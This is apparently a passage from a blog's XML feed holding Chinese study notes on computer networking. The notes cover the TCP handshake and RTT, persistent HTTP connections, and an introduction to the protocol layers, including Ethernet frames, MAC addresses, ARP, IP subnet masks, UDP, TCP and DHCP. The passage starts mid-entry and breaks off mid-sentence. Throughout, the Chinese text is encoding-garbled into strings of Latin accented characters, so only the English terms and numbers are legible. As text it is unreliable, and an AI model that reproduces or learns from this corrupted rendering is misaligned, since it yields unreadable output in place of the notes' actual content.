TCPè¿žæŽ¥åœ¨ä¸‰æ¬¡æ¡æ‰‹ä¸­çš„æ´»åŠ¨:ç‚¹å‡»é“¾æŽ¥ä¹‹åŽ,å®¢æˆ·æœºå…ˆå…ˆæœåŠ¡å™¨å‘é€ä¸€ä¸ªå°æŠ¥æ–‡æ®µ,æœåŠ¡å™¨ç”¨ä¸€ä¸ªTCPå°æŠ¥æ–‡æ®µåšå‡ºç¡®è®¤å’Œå“åº”,æœ€åŽå®¢æˆ·æœºå‘æœåŠ¡å™¨è¿”å›žç¡®è®¤(å’ŒHTTPè¯·æ±‚ä¸€èµ·).ä¸€ä¸ªRTTç­‰äºŽä¸‰æ¬¡æ¡æ‰‹ä¸­å‰ä¸¤ä¸ªéƒ¨åˆ†æ‰€è€—è´¹çš„æ—¶é—´.æ€»çš„å“åº”æ—¶é—´ç­‰äºŽä¸¤ä¸ªRTTåŠ ä¸ŠæœåŠ¡å™¨ä¼ è¾“HTMLçš„æ—¶é—´. ![](D:\My Daily\P\QQå›¾ç‰‡20200724220617.png) éžæŒä¹…è¿žæŽ¥çš„ç¼ºç‚¹:å¿…é¡»ä¸ºæ¯ä¸€ä¸ªè¯·æ±‚çš„å¯¹è±¡å»ºç«‹å’Œç»´æŠ¤ä¸€ä¸ªå…¨æ–°çš„è¿žæŽ¥.å¯¹äºŽæ¯ä¸ªè¿™æ ·çš„è¿žæŽ¥,å®¢æˆ·æœºå’ŒæœåŠ¡å™¨éƒ½è¦åˆ†é…TCPçš„ç¼“å†²åŒºå’Œå˜é‡,å°†ç»™æœåŠ¡å™¨å¸¦æ¥è´Ÿæ‹…. ä½†æ˜¯åœ¨æŒä¹…è¿žæŽ¥çš„æƒ…å†µä¸‹,ç›¸åŒçš„å®¢æˆ·æœºå’ŒæœåŠ¡å™¨çš„åŽç»­è¯·æ±‚å’Œå“åº”æŠ¥æ–‡å¯ä»¥é€šè¿‡ç›¸åŒçš„è¿žæŽ¥è¿›è¡Œä¼ é€.ç‰¹åˆ«æ˜¯ä¸€ä¸ªå®Œæ•´çš„webé¡µé¢ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½å¯ä»¥ç”¨å•ä¸ªæŒä¹…çš„TCPè¿žæŽ¥è¿›è¡Œä¼ é€,æ›´ç”šåŒä¸€å°æœåŠ¡å™¨çš„å¤šä¸ªé¡µé¢ä¼ è¾“åˆ°ç›¸åŒçš„å®¢æˆ·æœºæ—¶,å¯ä»¥å…±ç”¨ä¸€ä¸ªTCPè¿žæŽ¥.å¯¹è¿™äº›å¯¹è±¡çš„è¯·æ±‚å¯ä»¥é€ä¸ªå‘å‡ºè€Œä¸å¿…ç­‰å¾…æœªå†³è¯·æ±‚çš„å›žç­”.ä¸€èˆ¬æ¥è¯´ä¸€ä¸ªè¿žæŽ¥ç»è¿‡ä¸€ä¸ªå¯é…ç½®çš„æ—¶é—´é—´éš”ä»æœªè¢«ä½¿ç”¨,æœåŠ¡å™¨å°†å…³é—­è¯¥è¿žæŽ¥. HTTPè¯·æ±‚æŠ¥æ–‡çš„ç¬¬ä¸€è¡Œå«åšè¯·æ±‚è¡Œrequest line,åŽç»§çš„è¡Œå«åšé¦–éƒ¨è¡Œheader line.]]></content>
      <tags>
        <tag>è®¡ç®—æœºç½‘ç»œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[äº’è”ç½‘åè®®å…¥é—¨]]></title>
    <url>%2F2020%2F07%2F16%2F%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[ç¡¬å­¦è®¡ç½‘çš„æ—¶å€™æœ‰äº›å¤´å¤§,æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ,é¦–å…ˆå¯¹æ•´ä½“æœ‰ä¸€ä¸ªè®¤è¯†,å†æ¢ä¸€æœ¬ä¹¦,æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾çš„ã€ŠComputer Networking A Top-Down Approachã€‹. åºäº’è”ç½‘çš„æ ¸å¿ƒæ˜¯ä¸€ç³»åˆ—åè®®,æ€»ç§°ä¸ºäº’è”ç½‘åè®®:Internet Protocol Suite.å®ƒä»¬å¯¹ç”µè„‘å¦‚ä½•è¿žæŽ¥å’Œç»„ç½‘,åšå‡ºäº†è¯¦å°½çš„è§„å®š.ç†è§£äº†è¿™äº›åè®®çš„è§„å®š,å°±ç†è§£äº†äº’è”ç½‘çš„åŽŸç†. æ¦‚è¿°äº”å±‚æ¨¡åž‹è‡ªé¡¶å‘ä¸‹åˆ†åˆ«ä¸ºåº”ç”¨å±‚Application Layer,ä¼ è¾“å±‚Transport Layer,ç½‘ç»œå±‚Network Layer,é“¾è·¯å±‚Link Layerå’Œç‰©ç†å±‚Physical Layer.è¶Šä¸‹é¢çš„å±‚è¶Šé è¿‘ç¡¬ä»¶,è¶Šä¸Šé¢çš„å±‚è¶Šé è¿‘ç”¨æˆ·. å±‚ä¸Žåè®®æ¯ä¸€å±‚éƒ½æ˜¯ä¸ºäº†å®ŒæˆæŸä¸€ç§åŠŸèƒ½,ä¸ºäº†å®žçŽ°è¿™äº›åŠŸèƒ½å°±è¦ä¼ è¾“æ—¶éµå¾ªå…±åŒçš„è§„åˆ™protocol.äº’è”ç½‘çš„æ¯ä¸€å±‚éƒ½å®šä¹‰äº†å¾ˆå¤šåè®®,è¿™äº›åè®®çš„æ€»ç§°ä¸ºäº’è”ç½‘åè®®. ç‰©ç†å±‚ç”µè„‘è¦ç»„ç½‘,é¦–å…ˆå°±è¦å…ˆæŠŠç”µè„‘è¿žæŽ¥èµ·æ¥,å¯ä»¥ç”¨å…‰ç¼†,çº¿ç¼†,åŒç»žçº¿å’Œæ— çº¿ç”µæ³¢ç­‰æ–¹å¼(å’‹å’Œè°¢å¸Œä»ç‰ˆæœ‰ç‚¹ä¸ä¸€æ ·?è¿˜æ˜¯æˆ‘è®°é”™äº†).è¿™å°±å«åšç‰©ç†å±‚.å®ƒä¸»è¦è§„å®šäº†ç½‘ç»œçš„ä¸€äº›ç”µæ°”ç‰¹æ€§,ä½œç”¨æ˜¯è´Ÿè´£ä¼ è¾“0å’Œ1çš„ç”µä¿¡å·. é“¾è·¯å±‚å®šä¹‰å•çº¯çš„0å’Œ1å¹¶æ²¡æœ‰æ„ä¹‰,å¿…é¡»è§„å®šå…¶è§£è¯»æ–¹å¼:å¤šå°‘ä¸ªç”µä¿¡å·ç®—ä¸€ç»„,æ¯ä¸ªä¿¡å·æœ‰ä½•æ„ä¹‰?é“¾è·¯å±‚çš„åŠŸèƒ½å°±æ˜¯åœ¨å®žä½“å±‚çš„ä¸Šæ–¹ç¡®å®š0å’Œ1çš„åˆ†ç»„æ–¹å¼. ä»¥å¤ªç½‘åè®®Ethernetè§„å®š,ä¸€ç»„ç”µä¿¡å·æž„æˆä¸€ä¸ªæ•°æ®åŒ…å«åšå¸§(Frame).æ¯ä¸€å¸§åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†:æ ‡å¤´Headä¸Žæ•°æ®Data.HeadåŒ…å«æ•°æ®åŒ…çš„ä¸€äº›è¯´æ˜Žé¡¹,å¦‚å‘é€è€…,æŽ¥æ”¶è€…,æ•°æ®ç±»åž‹.æ•°æ®åˆ™æ˜¯æ•°æ®åŒ…çš„å…·ä½“å†…å®¹. æ ‡å¤´çš„é•¿åº¦å›ºå®šä¸º18å­—èŠ‚,æ•°æ®çš„é•¿åº¦æœ€çŸ­ä¸º46å­—èŠ‚,æœ€é•¿ä¸º1500å­—èŠ‚.å› æ­¤å¯¹äºŽä¸€å¸§æ¥è¯´,å¤§å°åŒºé—´ä¸º64-1518å­—èŠ‚.æ•°æ®è¿‡é•¿åˆ™åˆ†ä¸ºå¤šä¸ªå¸§å‘é€. MACåœ°å€ä¼ è¾“æ•°æ®çš„è¿‡ç¨‹ä¸­è¦æ ‡è¯†å‘é€è€…ä¸ŽæŽ¥æ”¶è€…,å°±è¦ä½¿ç”¨åˆ°MACåœ°å€.Ethernetè§„å®šè¿žå…¥ç½‘ç»œçš„æ‰€æœ‰è®¾å¤‡éƒ½å¿…é¡»æœ‰ç½‘å¡æŽ¥å£,æ•°æ®åŒ…å¿…é¡»æ˜¯ä»Žä¸€å—ç½‘å¡ä¼ é€åˆ°å¦ä¸€å—ç½‘å¡.ç½‘å¡çš„åœ°å€å°±æ˜¯æ•°æ®åŒ…çš„å‘é€åœ°å€ä¸ŽæŽ¥æ”¶åœ°å€å³MACåœ°å€.æ¯å—ç½‘å¡å‡ºåœºæ—¶éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„MACåœ°å€,é•¿åº¦ä¸º48ä¸ªäºŒè¿›åˆ¶ä½,å¸¸ç”¨12ä¸ª16è¿›åˆ¶æ•°è¡¨ç¤º.å‰6ä¸ªä½åŽ‚å•†ç¼–å·,åŽå…­ä¸ªä¸ºè¯¥åŽ‚å•†ç½‘å¡æµæ°´å·. å¹¿æ’­ä¸€å—ç½‘å¡è¦çŸ¥é“å¦ä¸€å—ç½‘å¡çš„MACåœ°å€,è¦ä½¿ç”¨åˆ°ARPåè®®(åœ¨è°¢å¸Œä»ç‰ˆä¸­è‡ªå­¦è¿‡,çŽ°åœ¨åˆç»™å¿˜äº†â€¦); çŸ¥é“MACåœ°å€ä¹‹åŽ,ç³»ç»Ÿæ€Žæ ·æ‰èƒ½æŠŠæ•°æ®åŒ…å‡†ç¡®é€åˆ°æŽ¥æ”¶æ–¹?Ethernetå¹¶ä¸æŠŠæ•°æ®åŒ…å‡†ç¡®é€åˆ°æŽ¥æ”¶æ–¹,è€Œæ˜¯å‘æœ¬ç½‘ç»œæ‰€æœ‰è®¡ç®—æœºå‘é€,è®©è®¡ç®—æœºè‡ªå·±åˆ¤æ–­æ˜¯å¦ä¸ºæŽ¥æ”¶æ–¹.è€Œå‘æœ¬ç½‘ç»œæ‰€æœ‰è®¡ç®—æœºå‘åŒ…çš„è¡Œä¸º,å°±å«åšå¹¿æ’­broadcasting. ç½‘ç»œå±‚ç½‘ç»œå±‚çš„ç”±æ¥æ ¹æ®Ethernetåè®®,ä¾é MACåœ°å€å‘é€æ•°æ®,ç†è®ºä¸Šå’ŒæŠ€æœ¯ä¸Šä¸–ç•Œä¸Šä»»ä½•ä¸€ä¸ªåœ°æ–¹çš„ç½‘å¡éƒ½èƒ½å¤Ÿæ‰¾åˆ°ä»»ä½•ä¸€ä¸ªåœ°æ–¹çš„ç½‘å¡.ä½†æ˜¯è¿™æ ·åšæœ‰ä¸€ä¸ªå·¨å¤§çš„ç¼ºç‚¹â€ä»¥å¤ªç½‘é‡‡ç”¨å¹¿æ’­çš„æ–¹å¼å‘é€æ•°æ®åŒ…,æ¯ä¸ªæˆå‘˜éƒ½ä¼šæ”¶åˆ°æ‰€æœ‰çš„åŒ….ä¸ä»…æ•ˆçŽ‡ä½Ž,è€Œä¸”åªèƒ½åœ¨å‘é€è€…çš„å­ç½‘ç»œä¸­ä¼ æ’­.(å¦‚æžœäº’è”ç½‘ä¸Šæ¯ä¸€å°è®¡ç®—æœºéƒ½æ”¶åˆ°æ‰€æœ‰çš„åŒ…ä¸å¯æƒ³è±¡). æ‰€ä»¥å¿…é¡»æ‰¾åˆ°ä¸€ç§æ–¹æ³•,èƒ½å¤ŸåŒºåˆ†MACåœ°å€æ˜¯å¦å±žäºŽä¸€ä¸ªå­ç½‘ç»œ.å¦‚æžœå±žäºŽä¸€ä¸ªå­ç½‘ç»œ,é‡‡ç”¨å¹¿æ’­çš„å½¢å¼å‘é€,å¦åˆ™é‡‡ç”¨è·¯ç”±(è·¯ç”±å³å‘ä¸åŒçš„å­ç½‘ç»œåˆ†å‘æ•°æ®åŒ…).è€ŒMACåœ°å€åªä¸ŽåŽ‚å•†æœ‰å…³ä¸Žç½‘ç»œæ— å…³,æ‰€ä»¥ç½‘ç»œå±‚è¯žç”Ÿäº†. å®ƒçš„ä½œç”¨æ˜¯å¼•è¿›ä¸€å¥—æ–°çš„åœ°å€,ä½¿æˆ‘ä»¬èƒ½å¤ŸåŒºåˆ†ä¸åŒçš„è®¡ç®—æœºæ˜¯å¦å±žäºŽä¸€ä¸ªå­ç½‘ç»œ. äºŽæ˜¯ç½‘ç»œå±‚å‡ºçŽ°åŽ,æ¯å°è®¡ç®—æœºå°±æœ‰äº†ä¸¤ç§åœ°å€,ä¸€ç§æ˜¯MACåœ°å€,å¦ä¸€ç§æ˜¯ç½‘ç»œåœ°å€(äºŒè€…ä¹‹é—´æ— ä»»ä½•è”ç³»).ç½‘ç»œåœ°å€å¸®åŠ©æˆ‘ä»¬ç¡®å®šè®¡ç®—æœºæ‰€åœ¨çš„å­ç½‘ç»œ,MACåœ°å€åˆ™å°†æ•°æ®åŒ…é€åˆ°è¯¥å­ç½‘ç»œçš„ç›®æ ‡ç½‘å¡.æ‰€ä»¥ä»Žé€»è¾‘ä¸Šçœ‹ä¸€å®šæ˜¯å…ˆå¤„ç†ç½‘ç»œåœ°å€,å†å¤„ç†MACåœ°å€. IPåè®®æ ¹æ®ç½‘ç»œåœ°å€çš„åè®®å°±å«åšIPåè®®,å…¶å®šä¹‰çš„åœ°å€å°±å«åšIPåœ°å€.IPåœ°å€ç”±ç½‘ç»œå·å’Œä¸»æœºå·ç»„æˆ.å¤„äºŽä¸€ä¸ªå­ç½‘ç»œçš„ç”µè„‘,å…¶IPåœ°å€çš„ç½‘ç»œéƒ¨åˆ†å¿…å®šæ˜¯ç›¸åŒçš„.ä¸»æœºéƒ¨åˆ†æ˜¯å¯¹åŒå¤„è¯¥å­ç½‘çš„ä¸»æœºè¿›è¡Œç¼–å·. ä¸ºäº†ä»ŽIPåœ°å€åˆ¤æ–­å‡ºä¸¤å°è®¡ç®—æœºæ˜¯å¦å¤„äºŽåŒä¸€ä¸ªå­ç½‘,å°±è¦ç”¨åˆ°å¦ä¸€ä¸ªå‚æ•°â€å­ç½‘æŽ©ç â€œå³subnet mask.å­ç½‘æŽ©ç ä½¿è¡¨ç¤ºå­ç½‘ç‰¹å¾çš„ä¸€ä¸ªå‚æ•°,åœ¨å½¢å¼ä¸Šç­‰åŒäºŽIPåœ°å€,ä¹Ÿæ˜¯ä¸€ä¸ª32ä½äºŒè¿›åˆ¶æ•°å­—.å…¶ç½‘ç»œéƒ¨åˆ†å…¨ä¸º1,ä¸»æœºéƒ¨åˆ†å…¨ä¸º0. çŸ¥é“IPåœ°å€ä¸Žå­ç½‘æŽ©ç åˆ¤æ–­æ˜¯å¦å±žäºŽåŒä¸€ä¸ªå­ç½‘çš„æ–¹æ³•:å°†ä¸¤ä¸ªIPåœ°å€åˆ†åˆ«äºŽå­ç½‘æŽ©ç è¿›è¡ŒANDè¿ç®—,ç»“æžœç›¸åŒåˆ™åœ¨ä¸€ä¸ªå­ç½‘. å·²çŸ¥IPåœ°å€172.16.154.1å’Œ172.16.254.233å­ç½‘æŽ©ç éƒ½æ˜¯255.255.255.0,è¯·é—®å…¶æ˜¯å¦åœ¨ä¸€ä¸ªå­ç½‘? æ€»ç»“IPåè®®çš„ä½œç”¨:ä¸€æ˜¯ä¸ºæ¯å°è®¡ç®—æœºåˆ†é…IPåœ°å€,å¦ä¸€ä¸ªæ˜¯ä¸ºç¡®å®šå“ªäº›åœ°å€å¤„äºŽä¸€ä¸ªå­ç½‘. IPæ•°æ®æŠ¥æ ¹æ®IPåè®®å‘é€çš„æ•°æ®,å°±å«åšIPæ•°æ®æŠ¥.ä½†æ˜¯Ethernetæ•°æ®æŠ¥åªåŒ…å«MACåœ°å€,å¹¶æ²¡æœ‰IPåœ°å€çš„æ ä½,æ˜¯å¦è¦ä¿®æ”¹æ•°æ®æŠ¥å®šä¹‰,å†æ·»åŠ ä¸€ä¸ªæ ä½?å›žç­”æ˜¯ä¸éœ€è¦,å› ä¸ºå¯ä»¥ç›´æŽ¥å°†IPæ•°æ®æŠ¥æ”¾è¿›Ethernetæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†.è¿™å°±æ˜¯äº’è”ç½‘åˆ†å±‚ç»“æž„çš„å¥½å¤„:ä¸Šå±‚å˜åŠ¨å®Œå…¨ä¸æ¶‰åŠä¸‹å±‚ç»“æž„. IPæ•°æ®æŠ¥çš„æ ‡å¤´(ç‰¹æŒ‡ä¸åœ¨Headä¸­è€Œåœ¨Dataä¸­çš„å…³äºŽIPä¿¡æ¯çš„Head)é•¿åº¦ä¸€èˆ¬åœ¨20-60å­—èŠ‚,æ•´ä¸ªæ•°æ®æŠ¥çš„é•¿åº¦æœ€å¤§ä¸º65535å­—èŠ‚.Ethernetæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†,æœ€é•¿åªæœ‰1500å­—èŠ‚,æ‰€ä»¥å¦‚æžœIPæ•°æ®æŠ¥è¶…è¿‡äº†1500å­—èŠ‚,å°±è¦åˆ†å‰²æˆå‡ ä¸ªEthernetæ•°æ®æŠ¥åˆ†å¼€å‘é€. ARPåè®®IPæ•°æ®æŠ¥æ˜¯æ”¾åœ¨ä»¥å¤ªç½‘æ•°æ®æŠ¥é‡Œå‘é€çš„.æ‰€ä»¥å¿…é¡»åŒæ—¶çŸ¥é“ä¸¤ä¸ªåœ°å€,ä¸€ä¸ªæ˜¯å¯¹æ–¹çš„MACåœ°å€,ä¸€ä¸ªæ˜¯å¯¹æ–¹çš„IPåœ°å€.é€šå¸¸æƒ…å†µä¸‹å¯¹æ–¹çš„IPåœ°å€æ˜¯å·²çŸ¥çš„,ä½†æ˜¯MACåœ°å€æœªçŸ¥.æ‰€ä»¥éœ€è¦ä¸€ç§åŸºå€ä»ŽIPåœ°å€å¾—åˆ°MACåœ°å€. ç¬¬ä¸€ç§æƒ…å†µ,ä¸¤ä¸ªä¸»æœºä¸åœ¨ä¸€ä¸ªå­ç½‘,åˆ™äº‹å®žä¸Šæ— æ³•å¾—åˆ°å¯¹æ–¹çš„MACåœ°å€,åªèƒ½å°†æ•°æ®åŒ…ä¼ é€åˆ°ä¸¤ä¸ªå­ç½‘è¿žæŽ¥å¤„çš„ç½‘å…³,è®©ç½‘å…³è¿›è¡Œå¤„ç†. ç¬¬äºŒç§æƒ…å†µ,ä¸¤ä¸ªä¸»æœºåœ¨ä¸€ä¸ªå­ç½‘,åˆ™ä½¿ç”¨ARPåè®®.ARPåè®®å‘å‡ºä¸€ä¸ªæ•°æ®æŠ¥,å…¶ä¸­åŒ…å«æ‰€è¦æŸ¥è¯¢çš„IPåœ°å€,åœ¨å¯¹æ–¹çš„MACåœ°å€è¿™ä¸€æ ,å¡«çš„æ˜¯FF:FF:FF:FF:FF:FF,è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¹¿æ’­åœ°å€.ä»–æ‰€åœ¨çš„å­ç½‘ç»œçš„æ¯ä¸€å°ä¸»æœº,éƒ½ä¼šæ”¶åˆ°è¿™ä¸ªæ•°æ®æŠ¥.ä»Žä¸­å–å‡ºIPåœ°å€,ä¸Žè‡ªèº«IPåœ°å€è¿›è¡Œæ¯”è¾ƒ,å¦‚æžœä¸¤è€…ç›¸åŒ,åˆ™åšå‡ºå›žå¤å‘å¯¹æ–¹æŠ¥å‘ŠMACåœ°å€,å¦åˆ™å°±ä¸¢å¼ƒè¿™ä¸ªåŒ…. ä¼ è¾“å±‚æœ‰äº†MACåœ°å€å’ŒIPåœ°å€,å°±å¯ä»¥åœ¨äº’è”ç½‘ä¸Šä»»æ„ä¸¤å°ä¸»æœºå»ºç«‹é€šä¿¡.ä½†æ˜¯åŒä¸€å°ä¸»æœºä¸Šæœ‰è®¸å¤šç¨‹åºéƒ½è¦ä½¿ç”¨åˆ°ç½‘ç»œ,é‚£ä¹ˆå°±éœ€è¦ä¸€ä¸ªå‚æ•°æ¥è¡¨ç¤ºè¿™ä¸ªæ•°æ®åŒ…åˆ°åº•ä¾›å“ªä¸ªè¿›ç¨‹ä½¿ç”¨,è¿™ä¸ªå‚æ•°å°±å«åšç«¯å£.å®ƒå…¶å®žæ˜¯æ¯ä¸€ä¸ªä½¿ç”¨ç½‘å¡çš„ç¨‹åºçš„ç¼–å·,æ¯ä¸ªæ•°æ®æŠ¥éƒ½å‘é€åˆ°ä¸»æœºçš„ç‰¹å®šç«¯å£,è¿™æ ·ä¸åŒçš„ç¨‹åºå°±èƒ½å¤Ÿå–åˆ°è‡ªå·±æ‰€éœ€è¦çš„æ•°æ®. ç«¯å£æ˜¯0åˆ°65535ä¹‹é—´çš„ä¸€ä¸ªæ•´æ•°,æ­£å¥½16ä¸ªäºŒè¿›åˆ¶ä½.0åˆ°1023çš„ç«¯å£è¢«ç³»ç»Ÿå ç”¨,ç”¨æˆ·åªèƒ½é€‰æ‹©å¤§äºŽ1023çš„ç«¯å£. ä¼ è¾“å±‚çš„åŠŸèƒ½æ˜¯å»ºç«‹ç«¯å£åˆ°ç«¯å£ä¹‹é—´çš„é€šä¿¡,ç›¸æ¯”ä¹‹ä¸‹ç½‘ç»œå±‚æ˜¯å»ºç«‹ä¸»æœºåˆ°ä¸»æœºä¹‹é—´çš„é€šä¿¡.åªè¦ç¡®å®šä¸»æœºå’Œç«¯å£,å°±èƒ½å®žçŽ°ç¨‹åºä¹‹é—´çš„äº¤æµ.å› æ­¤Unixå°±æŠŠä¸»æœº+ç«¯å£,å«åšâ€å¥—æŽ¥å­—â€socket. UDPåè®®çŽ°åœ¨æˆ‘ä»¬è¦åœ¨æ•°æ®æŠ¥ä¸­åŠ å…¥ç«¯å£ä¿¡æ¯,è¿™å°±éœ€è¦æ–°çš„åè®®.æœ€ç®€å•çš„å®žçŽ°å«åšUDPåè®®,å®ƒçš„æ ¼å¼å°±æ˜¯åœ¨æ•°æ®å‰é¢åŠ ä¸Šç«¯å£å·. Headéƒ¨åˆ†ä¸»è¦å®šä¹‰äº†å‘å‡ºç«¯å£ä¸ŽæŽ¥æ”¶æŽ¥å£,å…¶æ•°æ®æŠ¥éžå¸¸ç®€å•,Headéƒ¨åˆ†8ä¸ªå­—èŠ‚,æ€»é•¿åº¦ä¸è¶…è¿‡65535å­—èŠ‚,æ­£å¥½æ”¾è¿›ä¸€ä¸ªIPæ•°æ®æŠ¥.æ•°æ®éƒ¨åˆ†å°±æ˜¯å…·ä½“çš„å†…å®¹ç„¶åŽæŠŠæ•´ä¸ªUDPæ•°æ®æŠ¥æ”¾å…¥IPæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†.æ‰€ä»¥æ•´ä¸ªEthernetæ•°æ®æŠ¥å˜æˆäº†ä¸‹é¢è¿™æ ·: TCPåè®®UDPåè®®çš„ä¼˜ç‚¹åœ¨äºŽæ¯”è¾ƒç®€å•,å®¹æ˜“å®žçŽ°.ä½†æ˜¯ç¼ºç‚¹åœ¨äºŽä¸€æ—¦æ•°æ®æŠ¥å‘å‡º,æ— æ³•çŸ¥é“å¯¹æ–¹æ˜¯å¦çŸ¥é“.ä¸ºäº†æé«˜ç½‘ç»œå¯é æ€§,TCPåè®®å°±è¯žç”Ÿäº†.è¿™ä¸ªåè®®éžå¸¸å¤æ‚,ä½†å¯ä»¥è¿‘ä¼¼è®¤ä¸ºå®ƒæ˜¯æœ‰ç¡®è®¤æœºåˆ¶çš„.å› æ­¤TCPåè®®èƒ½å¤Ÿç¡®ä¿æ•°æ®ä¸ä¼šä¸¢å¤±,ä½†æ˜¯å®žçŽ°å›°éš¾,èµ„æºæ¶ˆè€—è¾ƒå¤š. TCPæ•°æ®æŠ¥å’ŒUDPæ•°æ®æŠ¥ä¸€æ ·,éƒ½æ˜¯å†…åµŒåœ¨IPæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†.TCPæ•°æ®æŠ¥æ²¡æœ‰é•¿åº¦é™åˆ¶,ç†è®ºä¸Šå¯ä»¥æ— é™é•¿.ä½†æ˜¯ä¸ºäº†ä¿è¯ç½‘ç»œçš„æ•ˆçŽ‡,é€šå¸¸TCPæ•°æ®æŠ¥çš„é•¿åº¦ä¸ä¼šè¶…è¿‡IPæ•°æ®æŠ¥çš„é•¿åº¦,ç¡®ä¿å•ä¸ªTCPæ•°æ®æŠ¥ä¸å¿…å†è¢«åˆ†å‰². åº”ç”¨å±‚åº”ç”¨ç¨‹åºæ”¶åˆ°ä¼ è¾“å±‚çš„æ•°æ®,æŽ¥ä¸‹æ¥å°±è¦è¿›è¡Œè§£è¯».ç”±äºŽäº’è”ç½‘æ˜¯å¼€æ”¾æž¶æž„,æ‰€ä»¥å¿…é¡»å…ˆè§„å®šå¥½æ ¼å¼.åº”ç”¨å±‚çš„ä½œç”¨,å°±æ˜¯è§„å®šåº”ç”¨ç¨‹åºçš„æ•°æ®æ ¼å¼.ä¸¾ä¾‹æ¥è¯´,TCPåè®®å¯ä»¥ä¸ºå„ç§å„æ ·çš„ç¨‹åºä¼ é€’æ•°æ®,Email/WWW/FTPç­‰,å¿…é¡»æœ‰ä¸åŒåè®®è§„å®šç”µå­é‚®ç”µ,ç½‘é¡µå’ŒFTPæ•°æ®çš„æ ¼å¼,è¿™äº›åº”ç”¨ç¨‹åºåè®®å°±æž„æˆäº†åº”ç”¨å±‚.è¿™æ˜¯æœ€é«˜çš„ä¸€å±‚,ç›´æŽ¥é¢å¯¹ç”¨æˆ·.å…¶æ•°æ®å°±åœ¨TCPæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†,å› æ­¤çŽ°åœ¨çš„Ethernetå˜æˆäº†ä¸‹é¢è¿™æ ·: ç½‘ç»œé€šä¿¡çš„å®žè´¨å°±æ˜¯äº¤æ¢ä¸Šé¢çš„æ•°æ®æŠ¥. å¯¹äºŽä¸åœ¨ä¸€ä¸ªå­ç½‘çš„ä¸¤å°è®¡ç®—æœºä¹‹é—´çš„é€šä¿¡(å‡è®¾1å·ç”µè„‘è¦å‘4å·ç”µè„‘å‘é€æ•°æ®æŠ¥),åˆ™1å·ç”µè„‘éœ€è¦çŸ¥é“ç½‘å…³Açš„MACåœ°å€(å’Œ4å·ç”µè„‘çš„IPåœ°å€).1å·ç”µè„‘å‘å‡ºæ•°æ®æŠ¥åˆ°ç½‘å…³A,ç½‘å…³Aé€šè¿‡è·¯ç”±åè®®å‘çŽ°4å·ç”µè„‘ä½äºŽç½‘ç»œB,åˆæŠŠæ•°æ®æŠ¥å‘ç»™ç½‘å…³B,Bå†è½¬å‘åˆ°4å·ç”µè„‘. åˆ¤æ–­æ˜¯å¦å¤„äºŽåŒä¸€å­ç½‘çš„æ–¹æ³•é™æ€IPåœ°å€æœ¬æœºIPåœ°å€,å­ç½‘æŽ©ç ,ç½‘å…³IPåœ°å€,DNSçš„IPåœ°å€æ˜¯TCP/IPåè®®çš„é‡è¦å‚æ•°,é€šä¿—æ¥è¯´çŸ¥é“å®ƒä»¬å°±å¯ä»¥ä¸Šç½‘.ç”±äºŽå®ƒä»¬æ˜¯ç»™å®šçš„,è®¡ç®—æœºæ¯æ¬¡å¼€æœºéƒ½åˆ†é…åˆ°ç›¸åŒçš„IPåœ°å€,æ‰€ä»¥è¿™ç§æ–¹æ³•è¢«ç§°ä½œé™æ€IPåœ°å€ä¸Šç½‘. ä½†æ˜¯å‡ºäºŽç®€ä¾¿æ€§,å¹¶ä¸”é¿å…IPåœ°å€æ— æ³•çµæ´»å˜æ›´,å¤§å¤šæ•°ç”¨æˆ·ä½¿ç”¨â€åŠ¨æ€IPä¸Šç½‘â€. åŠ¨æ€IPåœ°å€è®¡ç®—æœºå¼€æœºåŽä¼šè‡ªåŠ¨åˆ†é…åˆ°ä¸€ä¸ªIPåœ°å€,ä¸ç”¨äººä¸ºè®¾å®š,å®ƒä»¬ä½¿ç”¨çš„åè®®å«åšDHCPåè®®.è¯¥åè®®è§„å®šæ¯ä¸ªå­ç½‘ä¸­éƒ½æœ‰ä¸€å°è®¡ç®—æœºè´Ÿè´£ç®¡ç†æœ¬ç½‘ç»œçš„æ‰€æœ‰IPåœ°å€,å«åšDHCPæœåŠ¡å™¨.æ–°çš„è®¡ç®—æœºåŠ å…¥ç½‘ç»œ,å¿…é¡»å‘DHCPæœåŠ¡å™¨å‘é€ä¸€ä¸ªDHCPè¯·æ±‚æ•°æ®æŠ¥,ç”³è¯·IPåœ°å€å’Œç›¸å…³çš„ç½‘ç»œå‚æ•°.(æŒ‡å®šç®¡ç†IPåœ°å€çš„DHCPæœåŠ¡å™¨æœªå¼€æœºæ€Žä¹ˆåŠž????) æ–°åŠ å…¥çš„è®¡ç®—æœºä¸çŸ¥é“ä¸åŒå­ç½‘è®¡ç®—æœºçš„MACåœ°å€å’ŒIPåœ°å€,å¦‚ä½•å‘é€æ•°æ®æŠ¥?DHCPåè®®ä½œå‡ºäº†å·§å¦™è§„å®š: ç”±äºŽDHCPæ˜¯ä¸€ç§å»ºç«‹åœ¨UDPåè®®åŸºç¡€ä¸Šçš„åº”ç”¨å±‚åè®®,æ‰€ä»¥æ•´ä¸ªæ•°æ®æŠ¥é•¿è¿™ä¸ªæ ·å­: æœ€å‰é¢çš„Ethernet Head,è®¾ç½®å‘å‡ºæ–¹çš„MACåœ°å€å’ŒæŽ¥æ”¶æ–¹(DHCPæœåŠ¡å™¨)çš„MACåœ°å€,å‰è€…å°±æ˜¯æœ¬æœºç½‘å¡çš„MACåœ°å€,åŽè€…æ­¤æ—¶ä¸çŸ¥é“,å¡«å…¥å¹¿æ’­åœ°å€FF:FF:FF:FF åŽé¢çš„IP 